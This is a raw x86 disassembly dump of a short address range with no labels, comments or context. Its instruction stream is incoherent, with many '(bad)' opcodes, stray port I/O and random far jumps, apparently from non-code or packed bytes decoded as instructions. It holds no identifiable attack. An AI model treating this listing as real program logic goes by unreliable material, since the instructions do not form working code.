  41c821:	push   ebp
  41c822:	test   eax,0xcc88f13a
  41c827:	bound  edi,QWORD PTR [esi+ebx*2+0x50fa26b8]
  41c82e:	popa   
  41c82f:	mov    edi,0x67720c45
  41c834:	mov    esp,0x0
	...
  41c895:	add    BYTE PTR [ebx+0x34],ah
  41c898:	lods   eax,DWORD PTR ds:[esi]
  41c899:	xor    al,0xff
  41c89b:	mov    ebp,0x2e2377fb
  41c8a0:	js     0x41c910
  41c8a2:	mov    dl,0xf2
  41c8a4:	jne    0x41c898
  41c8a6:	jno    0x41c8d5
  41c8a8:	add    DWORD PTR [eax],eax
  41c8aa:	pop    es
  41c8ab:	add    DWORD PTR [eax],eax
  41c8ad:	add    BYTE PTR [edi+0x444ba72a],cl
  41c8b3:	xchg   DWORD PTR [esi-0x10b5c929],ebp
  41c8b9:	jp     0x41c84a
  41c8bb:	mov    ch,BYTE PTR [ecx+ebx*2-0x1a728e37]
  41c8c2:	cmp    eax,0x2a6ef9
  41c8c7:	cmp    ch,BYTE PTR [eax+0x53]
  41c8ca:	adc    eax,0x35e8cd74
  41c8cf:	push   0x29
  41c8d1:	sti    
  41c8d2:	ret    0x4b3c
  41c8d5:	out    dx,eax
  41c8d6:	jno    0x41c899
  41c8d8:	push   es
  41c8d9:	stc    
  41c8da:	scas   eax,DWORD PTR es:[edi]
  41c8db:	fisttp QWORD PTR [eax+eax*1]
  41c8de:	mov    esi,0x487727d6
  41c8e3:	jecxz  0x41c94d
  41c8e5:	or     eax,0xb70e6d14
  41c8ea:	cwde   
  41c8eb:	or     eax,DWORD PTR ds:0xb94843ec
  41c8f1:	inc    esi
  41c8f2:	pop    es
  41c8f3:	outs   dx,DWORD PTR ds:[esi]
  41c8f4:	dec    edx
  41c8f5:	dec    ebx
  41c8f6:	aad    0xbc
  41c8f8:	sub    al,0xfc
  41c8fa:	pop    esp
  41c8fb:	xor    al,0x21
  41c8fd:	jne    0x41c972
  41c8ff:	mov    edx,0x380ecbf
  41c904:	out    dx,eax
  41c905:	bound  esi,QWORD PTR [eiz*1-0x1ea2c73]
  41c90c:	mov    ebp,0x5f24c794
  41c911:	(bad)  
  41c912:	repz xor ebx,DWORD PTR [edx]
  41c915:	in     al,dx
  41c916:	sub    BYTE PTR ds:0x806364ac,cl
  41c91c:	(bad)
  41c920:	and    dl,0x39
  41c923:	xchg   ebx,eax
  41c924:	call   0xee29:0xa63a4de6
  41c92b:	mov    DWORD PTR [eax+0x39393573],ebx
  41c931:	inc    ebp
  41c932:	test   eax,0xf9a43483
  41c937:	jmp    0xa26f:0x6a11b18f
  41c93e:	(bad)  
  41c93f:	jecxz  0x41c8e6
  41c941:	inc    ebx
  41c942:	outs   dx,DWORD PTR ds:[esi]
  41c943:	adc    eax,0xe64f1176
  41c948:	inc    edx
  41c949:	jle    0x41c93d
  41c94b:	pop    es
  41c94c:	inc    ebp
  41c94d:	and    BYTE PTR [ebx+0x1c606224],bh
  41c953:	pop    ss
  41c954:	shl    DWORD PTR ds:0x789977ce,0x55
  41c95b:	mov    edx,0xc735b5fc
  41c960:	imul   ebx,DWORD PTR ds:0xb0f7cf0a,0xffffffb8
  41c967:	mov    edx,0xde6bde2d
  41c96c:	jne    0x41c938
  41c96e:	push   ds
  41c96f:	mov    DWORD PTR [edi],esp
  41c971:	std    
  41c972:	pusha  
  41c973:	add    al,0x80
  41c975:	test   BYTE PTR [ebp+esi*1+0x5e],ch
  41c979:	sbb    dh,BYTE PTR [eax-0x5d9399d4]
  41c97f:	mov    DWORD PTR [ebp+0xa8cdc22],edi
  41c985:	in     eax,0x48
  41c987:	mov    cl,0xc2
  41c989:	loope  0x41c99b
  41c98b:	ret    0xb4fd
  41c98e:	adc    edx,DWORD PTR [edi+0x42573be0]
  41c994:	fidiv  DWORD PTR ds:0xa3726b32
  41c99a:	jb     0x41ca0e
  41c99c:	out    0x28,eax
  41c99e:	pusha  
  41c99f:	add    al,0xe2
  41c9a1:	cwde   
  41c9a2:	cmp    ecx,DWORD PTR [edi+esi*4-0x4f0c317]
  41c9a9:	push   ss
  41c9aa:	cdq    
  41c9ab:	adc    esi,esp
  41c9ad:	lock mov BYTE PTR fs:[ebx-0x33],0x26
  41c9b3:	add    DWORD PTR [ebp+0x0],0x0
	...
  41ca13:	add    BYTE PTR [eax],al
  41ca15:	add    al,dh
  41ca17:	retf   0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0x1dca4132
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [ecx],bh
  41ca2f:	fs dec ebp
  41ca31:	sbb    DWORD PTR [esi+0x778c4850],ebp
  41ca37:	leave  
  41ca38:	mov    eax,ds:0x9177d34a
  41ca3d:	popf   
  41ca3e:	sahf   
  41ca3f:	xchg   DWORD PTR [eax],ebp
  41ca41:	xchg   esi,eax
  41ca42:	adc    DWORD PTR [edi],ebx
  41ca44:	pop    ss
  41ca45:	dec    ebx
  41ca46:	mov    edi,0x81338621
  41ca4b:	ins    DWORD PTR es:[edi],dx
  41ca4c:	punpckldq mm2,mm0
  41ca4f:	das    
  41ca50:	mov    DWORD PTR ds:0x595d1687,eax
  41ca56:	xchg   ecx,eax
  41ca57:	fcomp  DWORD PTR [esi+0x78]
  41ca5a:	sbb    ah,BYTE PTR [esi+ecx*1-0x636bf9dc]
  41ca61:	jp     0x41ca0b
  41ca63:	cmp    DWORD PTR [edx-0x4c30747],ecx
  41ca69:	fistp  DWORD PTR [edi+ebx*8-0x66]
  41ca6d:	ja     0x41ca8b
  41ca6f:	add    edi,DWORD PTR [edx]
  41ca71:	lea    eax,[esi-0x49]
  41ca74:	dec    esi
  41ca75:	retf   
  41ca76:	and    DWORD PTR [eax-0x8134baa],0xa935cc6e
  41ca80:	pop    esi
  41ca81:	inc    ebx
  41ca82:	inc    edi
  41ca83:	xchg   edx,eax
  41ca84:	sub    BYTE PTR [esi],dl
  41ca86:	adc    DWORD PTR [esi],esi
  41ca88:	sub    dl,BYTE PTR [ebx+0xf]
  41ca8b:	(bad)  
  41ca8c:	sub    DWORD PTR [ebx-0x4f],ecx
  41ca8f:	or     DWORD PTR [eax+edi*4],esi
  41ca92:	loop   0x41cab8
  41ca94:	dec    ebp
  41ca95:	push   ebp
  41ca96:	xor    bh,0x35
  41ca99:	pop    ss
  41ca9a:	jbe    0x41caab
  41ca9c:	add    cl,BYTE PTR [ebx-0x5a607e21]
  41caa2:	mov    bh,BYTE PTR [edi-0x1d7b7a88]
  41caa8:	push   edx
  41caa9:	imul   esp,esp,0x41
  41caac:	cmp    DWORD PTR [ebx+ebp*4+0x63],ebx
  41cab0:	(bad)  
  41cab1:	int    0x1c
  41cab3:	adc    eax,0x7e342282
  41cab8:	retf   0xacdb
  41cabb:	daa    
  41cabc:	jmp    0x71635355
  41cac1:	popf   
  41cac2:	inc    edi
  41cac3:	fwait
  41cac4:	aas    
  41cac5:	stos   DWORD PTR es:[edi],eax
  41cac6:	pop    esp
  41cac7:	imul   esi,ebp,0x322d8d
  41cacd:	fs adc al,0xa6
  41cad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cad1:	inc    ebx
  41cad2:	(bad)  
  41cad3:	loope  0x41ca76
  41cad5:	add    DWORD PTR [edi+0x5d],ecx
  41cad8:	or     al,0x6b
  41cada:	fs xchg ebp,eax
  41cadd:	icebp  
  41cade:	mov    edi,0x758d39d1
  41cae3:	repz cmp DWORD PTR [edx],edx
  41cae6:	xor    DWORD PTR [bp+di-0x3d],esp
  41caea:	out    dx,al
  41caeb:	mov    ecx,0x723f7cb1
  41caf0:	nop
  41caf1:	or     DWORD PTR [ebp+0x22636672],eax
  41caf7:	xchg   edx,eax
  41caf8:	enter  0x2c18,0x3c
  41cafc:	fimul  DWORD PTR [ebx-0x45fb2567]
  41cb02:	and    eax,DWORD PTR [ecx]
  41cb04:	pop    esp
  41cb05:	dec    ebp
  41cb06:	and    esi,DWORD PTR [eax-0x7264f01e]
  41cb0c:	push   esp
  41cb0d:	adc    dh,dl
  41cb0f:	dec    esp
  41cb10:	arpl   WORD PTR [ecx-0x4fbdea10],ax
  41cb16:	jbe    0x41cadf
  41cb18:	mov    eax,ds:0x9d3ab783
  41cb1d:	push   ss
  41cb1e:	(bad)  
  41cb1f:	call   0xa943:0xfbd6ca32
  41cb26:	jecxz  0x41cba6
  41cb28:	cmp    esp,DWORD PTR [edx+edx*4-0x67]
  41cb2c:	fcom   DWORD PTR [eax+ecx*8-0x4e]
  41cb30:	pop    esi
  41cb31:	cmp    cl,bh
  41cb33:	xchg   ebp,eax
  41cb34:	cmp    al,BYTE PTR [eax]
	...
  41cb96:	sub    esi,edx
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi-0x573dc3b4]
  41cba3:	fadd   DWORD PTR [ebp+0x12f7f44]
  41cba9:	add    BYTE PTR [edi],al
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    dl,ah
  41cbaf:	xor    edx,esp
  41cbb1:	cmp    eax,0xc433b596
  41cbb6:	xchg   ebx,eax
  41cbb7:	nop
  41cbb8:	and    al,0x26
  41cbba:	adc    dh,BYTE PTR [edi]
  41cbbc:	outs   dx,BYTE PTR ds:[esi]
  41cbbd:	mov    WORD PTR [ecx+0x7119f2bc],fs
  41cbc3:	xchg   esp,eax
  41cbc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbc5:	xchg   ebp,eax
  41cbc6:	mov    cl,0xd4
  41cbc8:	pop    ebp
  41cbc9:	into   
  41cbca:	adc    cl,BYTE PTR [eax+0x2f]
  41cbcd:	cmc    
  41cbce:	jnp    0x41cba4
  41cbd0:	adc    dh,0xfb
  41cbd3:	mov    esp,0x9f284163
  41cbd8:	mov    bl,0x6
  41cbda:	add    DWORD PTR [ecx+0x1b],ecx
  41cbdd:	xor    eax,0xba13c2c4
  41cbe2:	jb     0x41cbcb
  41cbe4:	cmp    al,0x64
  41cbe6:	dec    ebp
  41cbe7:	outs   dx,DWORD PTR ds:[esi]
  41cbe8:	or     DWORD PTR [eax-0x3ea5e67b],edi
  41cbee:	add    BYTE PTR [edx],0x3b
  41cbf1:	iret   
  41cbf2:	aad    0x32
  41cbf4:	(bad)  
  41cbf6:	(bad)  [esi-0x80]
  41cbf9:	push   es
  41cbfa:	lea    esp,[eax-0x71]
  41cbfd:	shr    ecx,1
  41cbff:	push   cs
  41cc00:	pop    esi
  41cc01:	popa   
  41cc02:	cs call 0x9001:0x61d2b85a
  41cc0a:	in     al,0xbd
  41cc0c:	addr16 mov bl,0x5d
  41cc0f:	mov    ch,0x40
  41cc11:	out    0xe3,al
  41cc13:	in     eax,0xb2
  41cc15:	mov    esi,0x4729c175
  41cc1a:	or     eax,0x9e97031b
  41cc1f:	mov    eax,0x32de3ec0
  41cc24:	es dec esp
  41cc26:	clc    
  41cc27:	xor    esi,DWORD PTR [ecx+0x10edcc8]
  41cc2d:	dec    edi
  41cc2e:	mov    ds:0xdbb5bd9,eax
  41cc33:	pop    edi
  41cc34:	dec    eax
  41cc35:	retf   
  41cc36:	imul   ecx,ebx,0x4189518c
  41cc3c:	in     eax,0xd9
  41cc3e:	call   0xf714f86
  41cc43:	pop    es
  41cc44:	dec    esp
  41cc46:	sbb    DWORD PTR [eax+0x42],esp
  41cc49:	lea    esi,[eax+0x4e]
  41cc4c:	lods   eax,DWORD PTR ds:[esi]
  41cc4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc4e:	push   ds
  41cc4f:	pop    edi
  41cc50:	pop    eax
  41cc51:	mov    ch,0xba
  41cc53:	in     al,dx
  41cc54:	dec    eax
  41cc55:	fdivr  DWORD PTR [edi]
  41cc57:	cmc    
  41cc58:	std    
  41cc59:	inc    esi
  41cc5a:	or     dl,dl
  41cc5c:	jecxz  0x41cc17
  41cc5e:	in     al,dx
  41cc5f:	mov    ah,0xcf
  41cc61:	int3   
  41cc62:	in     eax,dx
  41cc63:	ins    BYTE PTR es:[edi],dx
  41cc64:	ficom  DWORD PTR [edx]
  41cc66:	and    esi,eax
  41cc68:	xor    bl,ah
  41cc6a:	adc    eax,0x13a95a5e
  41cc6f:	loop   0x41ccd2
  41cc71:	push   esi
  41cc72:	add    esp,DWORD PTR [ecx]
  41cc74:	popa   
  41cc75:	lea    edi,[eax-0x317afdba]
  41cc7b:	cwde   
  41cc7c:	outs   dx,BYTE PTR ds:[esi]
  41cc7d:	jecxz  0x41cca4
  41cc7f:	inc    ebp
  41cc80:	mov    ds:0xd653deb0,eax
  41cc85:	shl    DWORD PTR [edx-0x464b8740],1
  41cc8b:	pop    ebp
  41cc8c:	pop    ds
  41cc8d:	fdiv   DWORD PTR [edx]
  41cc8f:	(bad)  
  41cc90:	(bad)  
  41cc91:	popa   
  41cc92:	dec    edx
  41cc93:	cmp    eax,0xfff1a402
  41cc98:	int    0x91
  41cc9a:	sbb    ebp,eax
  41cc9c:	xor    ebp,ecx
  41cc9e:	jecxz  0x41cc7d
  41cca0:	test   BYTE PTR [ebx+0x40ea6cfa],cl
  41cca6:	pop    edi
  41cca7:	enter  0xd437,0xca
  41ccab:	(bad)  
  41ccac:	loopne 0x41cc8b
  41ccae:	jge    0x41cc4a
  41ccb0:	(bad)  
  41ccb1:	jmp    0x41ccd5
  41ccb3:	and    BYTE PTR [eax+eax*1+0x0],ah
	...
  41cd13:	add    BYTE PTR [eax],al
  41cd15:	add    BYTE PTR [eax-0x67],ah
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	mov    bl,BYTE PTR [eax]
  41cd24:	sahf   
  41cd25:	out    0x86,eax
  41cd27:	xor    BYTE PTR [ecx],al
  41cd29:	add    BYTE PTR [edi],al
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    bh,al
  41cd2f:	cmp    ch,BYTE PTR [edi]
  41cd31:	scas   eax,DWORD PTR es:[edi]
  41cd32:	jnp    0x41ccda
  41cd34:	xor    BYTE PTR [edx-0x243a3f39],bl
  41cd3a:	jb     0x41cd4e
  41cd3c:	pop    ds
  41cd3d:	add    eax,0xb18d64f
  41cd42:	dec    ebp
  41cd43:	add    dl,BYTE PTR ds:0x29d9e70f
  41cd49:	adc    eax,0xc2568618
  41cd4e:	push   esp
  41cd4f:	cld    
  41cd50:	ds push edx
  41cd52:	mov    cl,bl
  41cd54:	xchg   ecx,eax
  41cd55:	cld    
  41cd56:	cmp    BYTE PTR [esi],bl
  41cd58:	es das 
  41cd5a:	aaa    
  41cd5b:	dec    eax
  41cd5c:	ins    DWORD PTR es:[edi],dx
  41cd5d:	push   0x38
  41cd5f:	leave  
  41cd60:	test   eax,0x59b10ca8
  41cd65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd66:	fstp   TBYTE PTR [ebx+esi*1]
  41cd69:	gs pop ebx
  41cd6b:	pusha  
  41cd6c:	fnsave [edi]
  41cd6e:	push   ss
  41cd6f:	addr16 in eax,0x1
  41cd72:	call   0x5315062d
  41cd77:	ins    DWORD PTR es:[edi],dx
  41cd78:	or     al,0x7d
  41cd7a:	adc    ebx,DWORD PTR [esi]
  41cd7c:	inc    esp
  41cd7d:	ds xchg ebx,eax
  41cd7f:	add    BYTE PTR [edx-0x28],al
  41cd82:	xor    BYTE PTR [edi-0x6d],dh
  41cd85:	repnz gs out dx,al
  41cd88:	mov    ecx,0xb679414b
  41cd8d:	dec    ebx
  41cd8e:	cwde   
  41cd8f:	rcl    DWORD PTR [ebx+0x37],cl
  41cd92:	popa   
  41cd93:	or     BYTE PTR [edx],cl
  41cd95:	dec    esp
  41cd96:	ror    ah,1
  41cd98:	jecxz  0x41ce0c
  41cd9a:	add    BYTE PTR ds:0xe672445d,bl
  41cda0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cda1:	sbb    BYTE PTR [edi+0x5f0bada7],0x2c
  41cda8:	mov    ebx,0xfe2caef3
  41cdad:	imul   ebx,DWORD PTR ds:0x118c0f6f,0xed2d3b15
  41cdb7:	xchg   DWORD PTR [ebx-0x9],edi
  41cdba:	sar    DWORD PTR [eax+0x73a780dd],1
  41cdc0:	(bad)  
  41cdc1:	test   BYTE PTR [ebp+0x43],0xc3
  41cdc5:	call   0x6ad4:0xe2de5ac5
  41cdcc:	inc    edi
  41cdcd:	mov    ecx,0x5d669239
  41cdd2:	je     0x41cd90
  41cdd4:	ss addr16 inc esp
  41cdd7:	stos   DWORD PTR es:[edi],eax
  41cdd8:	and    ah,BYTE PTR [esi-0x134236c2]
  41cdde:	call   0xd9ddcd5f
  41cde3:	inc    edx
  41cde4:	xchg   edi,eax
  41cde5:	jnp    0x41cdde
  41cde7:	sub    BYTE PTR [ecx-0x7c60d3a7],bh
  41cded:	jge    0x41cded
  41cdef:	pushf  
  41cdf0:	pop    esp
  41cdf1:	and    BYTE PTR [ebx+0x7d170731],ah
  41cdf7:	mov    esi,eax
  41cdf9:	retf   
  41cdfa:	retf   0x78e9
  41cdfd:	adc    al,0x51
  41cdff:	mov    edi,0xf2ace2b8
  41ce04:	fiadd  DWORD PTR [ebx]
  41ce06:	cmp    al,0xb8
  41ce08:	xchg   ecx,eax
  41ce09:	jp     0x41ce74
  41ce0b:	jo     0x41cd8e
  41ce0d:	or     BYTE PTR [ebx+ebx*8-0x53],ch
  41ce11:	jmp    0xf810:0x588e0d9c
  41ce18:	push   esi
  41ce19:	sti    
  41ce1a:	pop    esp
  41ce1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce1c:	push   0x98f070f2
  41ce21:	mov    ecx,0xcf08dd0f
  41ce26:	pop    ds
  41ce27:	jae    0x41ce7d
  41ce29:	cs and DWORD PTR es:[edx+edi*4-0x60],edx
  41ce2f:	lods   al,BYTE PTR ds:[esi]
  41ce30:	add    al,0xfc
  41ce32:	add    BYTE PTR [eax+0xd2],0x0
	...
  41ce95:	add    BYTE PTR [edi],al
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0x5df8d600
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    bl,bh
  41ceaf:	test   al,0x75
  41ceb1:	ja     0x41cef0
  41ceb3:	cmp    al,0xc9
  41ceb5:	ret    
  41ceb6:	div    BYTE PTR [esi-0x33]
  41ceb9:	sar    DWORD PTR [ecx],0xac
  41cebc:	lss    ecx,FWORD PTR [ecx]
  41cebf:	scas   eax,DWORD PTR es:[edi]
  41cec0:	inc    ebp
  41cec1:	jne    0x41cf3e
  41cec3:	dec    BYTE PTR [edx+0x2f902a3d]
  41cec9:	cs icebp 
  41cecb:	ror    BYTE PTR [ebp-0x76],0x29
  41cecf:	(bad)
  41ced2:	jns    0x41cec9
  41ced4:	sbb    cl,BYTE PTR [ecx]
  41ced6:	hlt    
  41ced7:	test   al,0x3f
  41ced9:	fnstsw WORD PTR [edi-0x590d5a25]
  41cedf:	sbb    al,0x6f
  41cee1:	mov    WORD PTR [ebx+0x50],fs
  41cee4:	in     al,dx
  41cee5:	stos   BYTE PTR es:[edi],al
  41cee6:	xchg   BYTE PTR [ebp+0x10984b0f],dh
  41ceec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceed:	add    cl,al
  41ceef:	lahf   
  41cef0:	jmp    0x41cef8
  41cef2:	mov    ch,0xc2
  41cef4:	jl     0x41cf38
  41cef6:	mov    ds:0x493f7bc1,eax
  41cefb:	std    
  41cefc:	imul   ecx,DWORD PTR [edi-0x69],0x2f16e4ac
  41cf03:	jbe    0x41cf66
  41cf05:	jmp    0xa4a4cce3
  41cf0a:	pusha  
  41cf0b:	lods   al,BYTE PTR ds:[esi]
  41cf0c:	call   0xb9c47f1c
  41cf11:	mov    ds:0xc5c87f14,eax
  41cf16:	sbb    al,0xc
  41cf18:	and    ah,BYTE PTR [ecx-0x58a3ddd7]
  41cf1e:	add    eax,0x59fb3195
  41cf23:	or     dh,BYTE PTR [ebx+0x4a]
  41cf26:	aas    
  41cf27:	hlt    
  41cf28:	jp     0x41cf2c
  41cf2a:	outs   dx,BYTE PTR ds:[esi]
  41cf2b:	loope  0x41cf04
  41cf2d:	xchg   edi,eax
  41cf2e:	jno    0x41cf49
  41cf30:	jge    0x41cf5c
  41cf32:	mov    dl,0xd1
  41cf34:	popa   
  41cf35:	jl     0x41ced5
  41cf37:	inc    BYTE PTR [eax]
  41cf39:	in     al,0x8d
  41cf3b:	push   eax
  41cf3c:	fwait
  41cf3d:	repz call 0xcd01:0x48eb3594
  41cf45:	push   edx
  41cf46:	or     al,0x12
  41cf48:	and    BYTE PTR [eax],dl
  41cf4a:	jo     0x41cf94
  41cf4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf4e:	sbb    edi,edx
  41cf50:	out    dx,eax
  41cf51:	enter  0x2a32,0x70
  41cf55:	cli    
  41cf56:	(bad)  
  41cf58:	jbe    0x41cfbf
  41cf5a:	push   es
  41cf5b:	sub    al,0x71
  41cf5d:	adc    dl,ah
  41cf5f:	sub    eax,0x10980882
  41cf64:	in     al,dx
  41cf65:	jbe    0x41cf19
  41cf67:	jnp    0x41cf42
  41cf69:	inc    BYTE PTR [eax]
  41cf6b:	mov    ebx,0x7c7954d6
  41cf70:	sbb    BYTE PTR ds:0x3f318048,dl
  41cf76:	fcom   QWORD PTR [ebp+0x3e]
  41cf79:	sub    al,0xc9
  41cf7b:	iret   
  41cf7c:	push   cs
  41cf7d:	dec    edx
  41cf7e:	push   esp
  41cf7f:	inc    ebx
  41cf80:	ds add al,0x4
  41cf83:	mov    edi,DWORD PTR [edi]
  41cf85:	sbb    dl,BYTE PTR es:[eax+0x7e]
  41cf89:	fnstenv [edx-0x63]
  41cf8c:	add    dl,BYTE PTR [ebx*4-0x365bb99c]
  41cf93:	jg     0x41cffd
  41cf95:	popf   
  41cf96:	sbb    ch,BYTE PTR [ecx]
  41cf98:	xchg   BYTE PTR [ebx-0x7a],al
  41cf9b:	test   al,0x9b
  41cf9d:	repnz pop eax
  41cf9f:	pxor   mm6,QWORD PTR [ebx+0x1c]
  41cfa3:	jnp    0x41cfeb
  41cfa5:	mov    ds:0xf4d4616f,eax
  41cfaa:	ret    0x7408
  41cfad:	jae    0x41cfc4
  41cfaf:	int3   
  41cfb0:	or     BYTE PTR ds:0x5171c8,dh
	...
  41d016:	mov    ecx,0xad432034
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	out    dx,al
  41d023:	and    eax,0x3294b9a5
  41d028:	add    DWORD PTR [eax],eax
  41d02a:	pop    es
  41d02b:	add    DWORD PTR [eax],eax
  41d02d:	add    BYTE PTR [ecx+eiz*2+0x4d],dh
  41d031:	data16 jns 0x41d099
  41d034:	xchg   esi,eax
  41d035:	les    edi,FWORD PTR [bx-0x2b3f]
  41d03a:	push   edi
  41d03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d03c:	leave  
  41d03d:	xchg   ebx,eax
  41d03e:	mov    bh,BYTE PTR [ecx+eax*1]
  41d041:	pop    eax
  41d042:	sar    DWORD PTR [ecx],1
  41d044:	add    BYTE PTR [esi+0xa],bl
  41d047:	call   FWORD PTR [ebx-0x53]
  41d04a:	shl    dh,cl
  41d04c:	xchg   ebp,eax
  41d04d:	xor    edx,ecx
  41d04f:	pop    ds
  41d050:	test   al,0x2b
  41d052:	xor    BYTE PTR [ebx+0xd],dl
  41d055:	fdivr  QWORD PTR [ecx+0x2]
  41d058:	daa    
  41d059:	mov    esp,gs
  41d05b:	mov    DWORD PTR [esp+eiz*8+0x70],edx
  41d05f:	pop    DWORD PTR [esi+0x5702343c]
  41d065:	or     esi,DWORD PTR [eax+0x65]
  41d068:	fimul  WORD PTR [esi-0x3e]
  41d06b:	lds    ebp,FWORD PTR [ecx-0x14]
  41d06e:	pop    edx
  41d06f:	push   0x99ee699b
  41d074:	mov    ch,BYTE PTR [ecx]
  41d076:	clc    
  41d077:	or     dh,0x95
  41d07a:	bound  ebp,QWORD PTR [ebx-0xc]
  41d07d:	dec    esi
  41d07e:	cli    
  41d07f:	xchg   edi,eax
  41d080:	(bad)  
  41d081:	rcl    BYTE PTR [ebx+0x4570ba1d],cl
  41d087:	xlat   BYTE PTR ds:[ebx]
  41d088:	aad    0x67
  41d08a:	js     0x41d0f5
  41d08c:	pop    edi
  41d08d:	jmp    0x2395:0x659967ee
  41d094:	lods   al,BYTE PTR ds:[esi]
  41d095:	sbb    esp,0xd45cfedd
  41d09b:	cmc    
  41d09c:	out    dx,eax
  41d09d:	pushf  
  41d09e:	inc    ecx
  41d09f:	xchg   ebp,eax
  41d0a0:	sub    BYTE PTR [ebx-0x1d],dl
  41d0a3:	jg     0x41d0f4
  41d0a5:	pop    edx
  41d0a6:	mov    esi,0xb8ec714c
  41d0ab:	inc    eax
  41d0ac:	popaw  
  41d0ae:	js     0x41d0cd
  41d0b0:	mov    ebx,0xdc4ad959
  41d0b5:	addr16 inc esi
  41d0b7:	sti    
  41d0b8:	sub    esi,ebp
  41d0ba:	mov    al,ds:0xf2fe1096
  41d0bf:	pop    esi
  41d0c0:	imul   ebx,DWORD PTR [edi],0x5d
  41d0c3:	mov    edi,0x51a0bcd4
  41d0c8:	push   ecx
  41d0c9:	sub    BYTE PTR [edx],dh
  41d0cb:	hlt    
  41d0cc:	push   0xd6761b0b
  41d0d1:	shr    DWORD PTR [eax+0x43ac97bc],1
  41d0d7:	dec    edi
  41d0d8:	cmp    ebx,esp
  41d0da:	sar    DWORD PTR [esi+0x5b09befc],1
  41d0e0:	sti    
  41d0e1:	jo     0x41d0b6
  41d0e3:	pop    ss
  41d0e4:	sub    BYTE PTR [edi-0x73],al
  41d0e7:	mov    ch,0x5e
  41d0e9:	repz cld 
  41d0eb:	out    0xdf,eax
  41d0ed:	aam    0xca
  41d0ef:	add    al,0xa7
  41d0f1:	mov    ds:0x5b367ef5,al
  41d0f6:	pushf  
  41d0f7:	dec    ebx
  41d0f8:	js     0x41d153
  41d0fa:	icebp  
  41d0fb:	xchg   esi,eax
  41d0fc:	dec    eax
  41d0fd:	pop    edi
  41d0fe:	not    al
  41d100:	adc    eax,0x8ae94f19
  41d105:	mov    esp,0x121ab5e8
  41d10a:	mov    WORD PTR [edi-0x33],fs
  41d10d:	stos   BYTE PTR es:[edi],al
  41d10e:	mov    eax,0x98558fb6
  41d113:	jge    0x41d154
  41d115:	xor    DWORD PTR [ebx+0x61b5fa0e],edx
  41d11b:	push   ss
  41d11c:	mov    cl,al
  41d11e:	out    dx,eax
  41d11f:	out    dx,eax
  41d120:	out    0xf2,al
  41d122:	or     eax,0xa79fce76
  41d127:	add    edi,ebx
  41d129:	int3   
  41d12a:	mov    dh,0xdd
  41d12c:	gs xchg esi,eax
  41d12e:	or     DWORD PTR [eax],eax
  41d130:	xor    ebx,edi
  41d132:	je     0x41d0ce
  41d134:	lods   eax,DWORD PTR ds:[esi]
	...
  41d195:	add    BYTE PTR [eax-0x3d],dl
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d19b
  41d1a3:	jge    0x41d1b2
  41d1a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1a6:	fwait
  41d1a7:	xor    eax,DWORD PTR [ecx]
  41d1a9:	add    BYTE PTR [edi],al
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [edx],bl
  41d1af:	scas   eax,DWORD PTR es:[edi]
  41d1b0:	(bad)  
  41d1b1:	jb     0x41d15f
  41d1b3:	mov    ah,0x9f
  41d1b5:	aam    0x93
  41d1b7:	test   BYTE PTR [ecx-0x57],0x18
  41d1bb:	push   0x4ca1f1fd
  41d1c0:	sti    
  41d1c1:	std    
  41d1c2:	enter  0x8901,0xd4
  41d1c6:	sti    
  41d1c7:	push   0xffffffe5
  41d1c9:	add    eax,0x7cd6d9ed
  41d1ce:	xor    DWORD PTR [ebx-0x67],eax
  41d1d1:	add    al,0xc4
  41d1d3:	outs   dx,BYTE PTR ds:[esi]
  41d1d4:	sbb    eax,0xcc289e52
  41d1d9:	push   cs
  41d1da:	in     eax,0x96
  41d1dc:	pop    ebp
  41d1dd:	lds    ebx,FWORD PTR [edi+eiz*4-0x14]
  41d1e1:	(bad)  
  41d1e2:	repz pop esi
  41d1e4:	inc    ebx
  41d1e5:	pop    ebp
  41d1e6:	addr16 leave 
  41d1e8:	adc    eax,0x24a759a5
  41d1ed:	dec    esi
  41d1ee:	outs   dx,BYTE PTR ds:[esi]
  41d1ef:	ins    BYTE PTR es:[edi],dx
  41d1f0:	cld    
  41d1f1:	loopne 0x41d1a6
  41d1f3:	sbb    ch,cl
  41d1f5:	mov    dh,0x2f
  41d1f7:	int3   
  41d1f8:	out    0x18,eax
  41d1fa:	shl    BYTE PTR [ebx],0xec
  41d1fd:	js     0x41d21d
